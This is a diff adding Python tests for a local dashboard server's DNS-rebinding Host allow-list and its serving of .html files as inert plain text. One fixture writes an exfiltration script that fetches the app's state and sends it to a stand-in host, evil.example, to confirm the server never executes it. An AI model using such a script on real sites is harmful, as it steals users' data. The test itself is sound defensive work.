@@ -221,3 +221,86 @@ def test_export_writes_self_contained_file(hunt_root, tmp_path):
     assert "Hunt Dashboard" in content
     assert "http-equiv" not in content  # static export never auto-refreshes
     assert "acme.com" in content
+
+
+# ---------------------------------------------------------------------------
+# Host-header allow-list (DNS-rebinding guard)
+# ---------------------------------------------------------------------------
+
+
+def test_host_allowed_accepts_loopback():
+    allowed = db.build_allowed_hosts("127.0.0.1")
+    assert db.host_allowed("127.0.0.1:8777", allowed)
+    assert db.host_allowed("localhost:8777", allowed)
+    assert db.host_allowed("localhost", allowed)
+    assert db.host_allowed("[::1]:8777", allowed)
+
+
+def test_host_allowed_rejects_foreign_and_empty():
+    allowed = db.build_allowed_hosts("127.0.0.1")
+    assert not db.host_allowed("evil.example", allowed)          # DNS-rebinding host
+    assert not db.host_allowed("evil.example:8777", allowed)
+    assert not db.host_allowed("", allowed)                       # no Host header
+
+
+def test_build_allowed_hosts_rules():
+    # loopback always present
+    assert "127.0.0.1" in db.build_allowed_hosts("0.0.0.0")
+    # a specific bind host is added...
+    assert "10.0.0.5" in db.build_allowed_hosts("10.0.0.5")
+    # ...but the wildcard bind is not treated as an allowed Host name
+    assert "0.0.0.0" not in db.build_allowed_hosts("0.0.0.0")
+    # operator escape hatch
+    assert "dash.local" in db.build_allowed_hosts("127.0.0.1", ["dash.local"])
+
+
+# ---------------------------------------------------------------------------
+# Live server: .html is served inert, foreign Host is rejected
+# ---------------------------------------------------------------------------
+
+
+def _serve_in_thread(root):
+    import threading
+    from http.server import ThreadingHTTPServer
+    httpd = ThreadingHTTPServer(("127.0.0.1", 0), db.make_handler(root, db.build_allowed_hosts("127.0.0.1")))
+    t = threading.Thread(target=httpd.serve_forever, daemon=True)
+    t.start()
+    return httpd, httpd.server_address[1]
+
+
+def _get(port, path, host="127.0.0.1"):
+    import http.client
+    conn = http.client.HTTPConnection("127.0.0.1", port, timeout=5)
+    conn.request("GET", path, headers={"Host": host})
+    resp = conn.getresponse()
+    body = resp.read()
+    conn.close()
+    return resp.status, dict(resp.getheaders()), body
+
+
+def test_file_serves_html_as_inert_text(tmp_path):
+    # a hostile "recon capture" saved as .html that would exfil if run as HTML
+    evil = tmp_path / "findings" / "t" / "evil.html"
+    evil.parent.mkdir(parents=True)
+    evil.write_text("<script>fetch('/api/state').then(r=>r.text())"
+                    ".then(d=>fetch('https://evil.example/?'+d))</script>", encoding="utf-8")
+    httpd, port = _serve_in_thread(str(tmp_path))
+    try:
+        status, headers, body = _get(port, "/file?path=findings/t/evil.html")
+    finally:
+        httpd.shutdown()
+    assert status == 200
+    assert headers.get("Content-Type", "").startswith("text/plain")   # NOT text/html
+    assert headers.get("X-Content-Type-Options") == "nosniff"          # no MIME sniffing
+    assert b"<script>" in body  # returned verbatim as text, never parsed as HTML
+
+
+def test_foreign_host_is_rejected(tmp_path):
+    httpd, port = _serve_in_thread(str(tmp_path))
+    try:
+        ok_status, _, _ = _get(port, "/", host="127.0.0.1")
+        bad_status, _, _ = _get(port, "/", host="evil.example")
+    finally:
+        httpd.shutdown()
+    assert ok_status == 200
+    assert bad_status == 403  # DNS-rebinding guard
